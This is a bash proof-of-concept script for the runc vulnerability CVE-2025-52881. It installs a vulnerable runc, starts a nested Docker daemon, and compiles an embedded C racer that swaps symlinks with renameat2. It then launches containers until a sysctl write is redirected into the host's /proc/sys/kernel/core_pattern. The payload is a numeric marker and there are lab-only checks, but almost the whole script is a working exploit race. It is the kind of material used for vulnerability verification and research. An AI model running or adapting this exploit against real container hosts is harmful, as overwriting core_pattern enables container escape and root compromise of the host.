#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
WORK_DIR="${WORK_DIR:-$SCRIPT_DIR}"
if [ -z "${SETUP_SCRIPT:-}" ]; then
  if [ -x "$WORK_DIR/poc-docker-setup.sh" ]; then
    SETUP_SCRIPT="$WORK_DIR/poc-docker-setup.sh"
  else
    SETUP_SCRIPT="$WORK_DIR/poc-setup.sh"
  fi
fi
RESULT_DIR="${RESULT_DIR:-$WORK_DIR/results/docker-redirect-only}"
STATE_DIR="${STATE_DIR:-/tmp/cve-2025-52881-docker-redirect-only}"
DOCKERD_LOG="${DOCKERD_LOG:-$RESULT_DIR/dockerd.log}"
DOCKER_HOST="${DOCKER_HOST:-unix:///var/run/docker.sock}"

detect_runc_arch() {
  case "$(uname -m)" in
    x86_64|amd64) echo amd64 ;;
    aarch64|arm64) echo arm64 ;;
    armv7l|armhf) echo armhf ;;
    ppc64le) echo ppc64le ;;
    s390x) echo s390x ;;
    *) echo amd64 ;;
  esac
}

RUNC_ARCH="${RUNC_ARCH:-$(detect_runc_arch)}"
RUNC_VULN="${RUNC_VULN:-$WORK_DIR/bin/runc-v1.2.7.$RUNC_ARCH}"
SYSTEM_RUNC="${SYSTEM_RUNC:-/usr/bin/runc}"
RUNC_INSTALL_PATHS="${RUNC_INSTALL_PATHS:-/usr/bin/runc /usr/sbin/runc}"
IMAGE="${IMAGE:-alpine:3.20}"
ATTEMPTS="${ATTEMPTS:-50}"
START_DOCKERD="${START_DOCKERD:-1}"
RUN_SETUP="${RUN_SETUP:-1}"
KEEP_RESULTS="${KEEP_RESULTS:-0}"
RESTORE_CORE_PATTERN="${RESTORE_CORE_PATTERN:-0}"
MARKER_BASE="${MARKER_BASE:-$((528810000 + ($(date +%s) % 100000) * 1000))}"
ORIGINAL_CORE_PATTERN=""

usage() {
  cat <<EOF
Usage: $0 [options]

Options:
  --attempts N       Victim docker-run attempts. Default: $ATTEMPTS
  --image NAME       Victim/racer image. Default: $IMAGE
  --no-setup         Do not invoke setup when the vulnerable runc binary is missing.
  --keep-results     Keep temporary race state under /tmp after exit.
  --restore          Restore the original core_pattern before exit.
  -h, --help         Show this help.

This is a PoC-only script for CVE-2025-52881.
It demonstrates procfs write redirection into /proc/sys/kernel/core_pattern.
It does not run a fixed-version comparison, does not use a pipe helper, and does not crash
any process.
EOF
}

while [ "$#" -gt 0 ]; do
  case "$1" in
    --attempts)
      ATTEMPTS="$2"
      shift 2
      ;;
    --image)
      IMAGE="$2"
      shift 2
      ;;
    --no-setup)
      RUN_SETUP=0
      shift
      ;;
    --keep-results)
      KEEP_RESULTS=1
      shift
      ;;
    --restore)
      RESTORE_CORE_PATTERN=1
      shift
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      echo "[-] Unknown option: $1" >&2
      usage >&2
      exit 2
      ;;
  esac
done

log() {
  printf '[*] %s\n' "$*"
}

ok() {
  printf '[+] %s\n' "$*"
}

die() {
  printf '[-] %s\n' "$*" >&2
  exit 1
}

require_lab() {
  if [ "${ALLOW_NON_DIND:-0}" = "1" ]; then
    return
  fi
  if [ -f /.dockerenv ]; then
    return
  fi
  if grep -qaE 'docker|containerd|kubepods|libpod' /proc/1/cgroup 2>/dev/null; then
    return
  fi
  die "Refusing to run outside an apparent container lab. Set ALLOW_NON_DIND=1 to override."
}

require_root_and_core_pattern() {
  [ "$(id -u)" = "0" ] || die "Must run as root in the privileged Docker/VM lab."
  [ -w /proc/sys/kernel/core_pattern ] || die "/proc/sys/kernel/core_pattern is not writable. Use a privileged lab container or disposable VM."
}

read_core_pattern() {
  cat /proc/sys/kernel/core_pattern
}

restore_core_pattern() {
  if [ "$RESTORE_CORE_PATTERN" = "1" ] && [ -n "$ORIGINAL_CORE_PATTERN" ]; then
    printf '%s' "$ORIGINAL_CORE_PATTERN" >/proc/sys/kernel/core_pattern || true
  fi
}

cleanup_containers() {
  docker rm -f cve52881-poc-racer >/dev/null 2>&1 || true
  docker ps -aq --filter 'name=cve52881-poc-victim-' | xargs -r docker rm -f >/dev/null 2>&1 || true
}

cleanup_state() {
  cleanup_containers || true
  restore_core_pattern
  if [ "$KEEP_RESULTS" != "1" ]; then
    rm -rf "$STATE_DIR"
  fi
}

reset_result_dir() {
  case "$RESULT_DIR" in
    ""|"/"|"/tmp"|"/var"|"/usr"|"/bin"|"/sbin"|"/etc")
      die "Refusing to clean unsafe RESULT_DIR: $RESULT_DIR"
      ;;
  esac
  rm -rf "$RESULT_DIR"
  mkdir -p "$RESULT_DIR"
}

ensure_vulnerable_runc() {
  if [ -x "$RUNC_VULN" ]; then
    ok "Vulnerable runc binary found: $RUNC_VULN"
    return
  fi
  [ "$RUN_SETUP" = "1" ] || die "Missing vulnerable runc binary: $RUNC_VULN"
  [ -x "$SETUP_SCRIPT" ] || die "Missing setup script: $SETUP_SCRIPT"
  log "Vulnerable runc binary missing. Running vulnerable-only setup..."
  SETUP_FIXED=0 "$SETUP_SCRIPT"
  [ -x "$RUNC_VULN" ] || die "Setup finished but vulnerable runc is still missing: $RUNC_VULN"
}

install_vulnerable_runc() {
  log "Installing vulnerable runc into Docker runtime paths..."
  for path in $RUNC_INSTALL_PATHS; do
    mkdir -p "$(dirname "$path")"
    cp "$RUNC_VULN" "$path"
    chmod 0755 "$path"
    ok "Installed $path"
  done
  ok "Runtime runc version:"
  "$SYSTEM_RUNC" --version | sed 's/^/    /'
}

stop_dockerd() {
  export DOCKER_HOST
  if docker info >/dev/null 2>&1; then
    cleanup_containers || true
  fi
  pkill -TERM dockerd >/dev/null 2>&1 || true
  pkill -TERM containerd >/dev/null 2>&1 || true
  for _ in $(seq 1 20); do
    if ! pgrep -x dockerd >/dev/null 2>&1 && ! pgrep -x containerd >/dev/null 2>&1; then
      return
    fi
    sleep 0.2
  done
  pkill -KILL dockerd >/dev/null 2>&1 || true
  pkill -KILL containerd >/dev/null 2>&1 || true
}

start_dockerd() {
  export DOCKER_HOST
  mkdir -p "$RESULT_DIR"

  if docker info >/dev/null 2>&1; then
    ok "Nested Docker daemon is already reachable"
    return
  fi

  [ "$START_DOCKERD" = "1" ] || die "Docker daemon is not reachable and START_DOCKERD=0"
  log "Starting nested Docker daemon..."
  mkdir -p /var/run /var/lib/docker "$RESULT_DIR"
  dockerd --host="$DOCKER_HOST" --storage-driver=vfs >"$DOCKERD_LOG" 2>&1 &
  echo "$!" >"$RESULT_DIR/dockerd.pid"

  for _ in $(seq 1 90); do
    if docker info >/dev/null 2>&1; then
      ok "Nested Docker daemon is ready"
      return
    fi
    sleep 1
  done

  sed -n '1,160p' "$DOCKERD_LOG" >&2 || true
  die "Nested Docker daemon did not become ready"
}

record_environment() {
  local env_file="$RESULT_DIR/environment.txt"
  {
    echo "date=$(date -Is)"
    echo "kernel=$(uname -a)"
    echo "image=$IMAGE"
    echo "attempts=$ATTEMPTS"
    echo "work_dir=$WORK_DIR"
    echo "result_dir=$RESULT_DIR"
    echo "state_dir=$STATE_DIR"
    echo "core_pattern_original=$ORIGINAL_CORE_PATTERN"
    echo
    echo "[docker version]"
    docker version || true
    echo
    echo "[runc currently installed]"
    type -a runc || true
    for path in $RUNC_INSTALL_PATHS; do
      echo
      echo "[$path]"
      "$path" --version || true
    done
  } >"$env_file" 2>&1
  ok "Environment saved: $env_file"
}

write_racer_source() {
  mkdir -p "$STATE_DIR"
  cat >"$STATE_DIR/racer.c" <<'EOF'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

static volatile sig_atomic_t keep_running = 1;

static void stop(int sig) {
  (void)sig;
  keep_running = 0;
}

static int xrename_exchange(const char *a, const char *b) {
  return (int)syscall(SYS_renameat2, AT_FDCWD, a, AT_FDCWD, b, RENAME_EXCHANGE);
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s /race\n", argv[0]);
    return 2;
  }
  if (chdir(argv[1]) != 0) {
    perror("chdir");
    return 2;
  }
  signal(SIGTERM, stop);
  signal(SIGINT, stop);

  unsigned long long swaps = 0;
  while (keep_running) {
    if (xrename_exchange("proc", "proc.swap") != 0) {
      if (errno == ENOSYS || errno == EINVAL) {
        fprintf(stderr, "renameat2(RENAME_EXCHANGE) unavailable: %s\n", strerror(errno));
        return 3;
      }
      continue;
    }
    swaps++;
    if ((swaps & 0xfffffULL) == 0) {
      sched_yield();
    }
  }
  fprintf(stderr, "swaps=%llu\n", swaps);
  return 0;
}
EOF
}

build_racer() {
  write_racer_source
  log "Building racer helper..."
  if gcc -O2 -static -o "$STATE_DIR/racer" "$STATE_DIR/racer.c" >"$RESULT_DIR/racer-build.log" 2>&1; then
    :
  else
    log "Static racer build failed. Retrying dynamic build..."
    gcc -O2 -o "$STATE_DIR/racer" "$STATE_DIR/racer.c" >>"$RESULT_DIR/racer-build.log" 2>&1
  fi
  chmod 0755 "$STATE_DIR/racer"
  ok "Racer helper built: $STATE_DIR/racer"
}

prepare_race_dirs() {
  local root="$1"
  local shared="$root/shared"
  local payload="$root/payload"

  rm -rf "$root"
  mkdir -p "$shared/safe/sys/net/ipv4" "$payload"

  ln -s safe "$shared/proc"
  ln -s /proc "$shared/proc.swap"
  ln -s /proc/sys/kernel/core_pattern "$payload/ping_group_range"

  printf '%s\n' "$shared"
  printf '%s\n' "$payload"
}

start_racer_container() {
  local shared="$1"
  cleanup_containers
  docker run -d \
    --name cve52881-poc-racer \
    --rm \
    --mount "type=bind,src=$shared,dst=/race" \
    --mount "type=bind,src=$STATE_DIR/racer,dst=/racer,readonly" \
    "$IMAGE" /racer /race >"$RESULT_DIR/racer.cid"

  sleep 1
  if ! docker ps --format '{{.Names}}' | grep -qx 'cve52881-poc-racer'; then
    docker logs cve52881-poc-racer >&2 || true
    die "Racer container exited unexpectedly"
  fi
  ok "Racer container is running"
}

make_marker_payload() {
  local attempt="$1"
  printf '0 %s' "$((MARKER_BASE + 100000 + attempt))"
}

run_redirect_race() {
  local trial_dir="$RESULT_DIR/trial-1"
  local state_root="$STATE_DIR/trial-1"
  local dirs shared payload marker victim_name current hit_attempt=0 observed_attempts=0

  mkdir -p "$trial_dir"

  log "Preparing shared race directory..."
  mapfile -t dirs < <(prepare_race_dirs "$state_root")
  shared="${dirs[0]}"
  payload="${dirs[1]}"
  ok "Shared source: $shared"
  ok "Payload source: $payload"
  ok "Redirect target: /proc/sys/kernel/core_pattern"
  ok "Victim sysctl key: net.ipv4.ping_group_range"

  log "Starting racer container..."
  start_racer_container "$shared"

  log "Launching victim containers until the redirected write is observed..."
  for attempt in $(seq 1 "$ATTEMPTS"); do
    marker="$(make_marker_payload "$attempt")"
    victim_name="cve52881-poc-victim-${attempt}"

    {
      echo "attempt=$attempt"
      echo "payload_kind=numeric-marker"
      echo "payload_value=$marker"
      echo "target=/proc/sys/kernel/core_pattern"
      echo "shared=$shared"
      echo "payload=$payload"
      echo "before=$(read_core_pattern)"
    } >"$trial_dir/attempt-$attempt.meta"

    set +e
    docker run --rm \
      --name "$victim_name" \
      --mount "type=bind,src=$shared,dst=/race" \
      --mount "type=bind,src=$payload,dst=/race/proc/sys/net/ipv4" \
      --sysctl "net.ipv4.ping_group_range=$marker" \
      "$IMAGE" true >"$trial_dir/attempt-$attempt.stdout" 2>"$trial_dir/attempt-$attempt.stderr"
    local rc=$?
    set -e

    current="$(read_core_pattern)"
    {
      echo "docker_rc=$rc"
      echo "after=$current"
    } >>"$trial_dir/attempt-$attempt.meta"

    docker rm -f "$victim_name" >/dev/null 2>&1 || true

    if [ "$current" = "$marker" ]; then
      hit_attempt="$attempt"
      observed_attempts="$attempt"
      echo "$marker" >"$trial_dir/hit-payload.txt"
      echo "$attempt" >"$trial_dir/hit-attempt.txt"
      break
    fi
    observed_attempts="$attempt"

    if [ "$((attempt % 10))" -eq 0 ]; then
      log "Attempts completed: $attempt / $ATTEMPTS"
    fi
  done

  docker rm -f cve52881-poc-racer >/dev/null 2>&1 || true

  if [ "$hit_attempt" -gt 0 ]; then
    local single_run_rate retry_window_rate
    single_run_rate="$(awk -v hit="$hit_attempt" 'BEGIN { printf "%.2f", 100.0 / hit }')"
    retry_window_rate="$(awk -v hit="$hit_attempt" -v attempts="$ATTEMPTS" 'BEGIN { p = 1.0 / hit; printf "%.2f", (1.0 - exp(attempts * log(1.0 - p))) * 100.0 }')"
    {
      echo "hit_attempt=$hit_attempt"
      echo "observed_attempts=$observed_attempts"
      echo "attempt_budget=$ATTEMPTS"
      echo "single_run_success_rate_percent=$single_run_rate"
      echo "retry_window_success_probability_percent=$retry_window_rate"
    } >"$trial_dir/success-rate.txt"
    echo
    ok "Redirect observed"
    ok "Hit attempt: $hit_attempt"
    ok "Written marker: $(cat "$trial_dir/hit-payload.txt")"
    ok "Observed single-run success rate: ${single_run_rate}% (1 hit / ${hit_attempt} attempts)"
    ok "Estimated success probability for $ATTEMPTS attempts: ${retry_window_rate}%"
    return 0
  fi

  echo
  {
    echo "hit_attempt=0"
    echo "observed_attempts=$observed_attempts"
    echo "attempt_budget=$ATTEMPTS"
    echo "single_run_success_rate_percent=0.00"
    echo "retry_window_success_probability_percent=0.00"
  } >"$trial_dir/success-rate.txt"
  die "Redirect was not observed after $ATTEMPTS attempts"
}

main() {
  echo "=== CVE-2025-52881 runc procfs write redirect PoC ==="
  echo "=== Vulnerable-version PoC only: no crash and no core_pattern helper ==="
  echo
  log "Target: /proc/sys/kernel/core_pattern"
  log "Primitive: runc sysctl write redirection"
  log "Payload: numeric marker only"
  echo

  require_lab
  require_root_and_core_pattern
  reset_result_dir
  mkdir -p "$STATE_DIR"
  ORIGINAL_CORE_PATTERN="$(read_core_pattern)"
  trap cleanup_state EXIT

  log "Original core_pattern: $ORIGINAL_CORE_PATTERN"
  ensure_vulnerable_runc
  install_vulnerable_runc
  stop_dockerd
  start_dockerd
  record_environment
  log "Pulling Docker image: $IMAGE"
  docker pull "$IMAGE" >/dev/null
  ok "Image ready: $IMAGE"
  build_racer

  echo "$ORIGINAL_CORE_PATTERN" >"$RESULT_DIR/core_pattern.original"
  run_redirect_race

  if [ "$RESTORE_CORE_PATTERN" = "1" ]; then
    restore_core_pattern
  fi
  echo "$(read_core_pattern)" >"$RESULT_DIR/core_pattern.final"

  echo
  ok "PoC SUCCESSFUL"
  ok "Final core_pattern: $(read_core_pattern)"
  ok "Evidence directory: $RESULT_DIR"
}

main "$@"
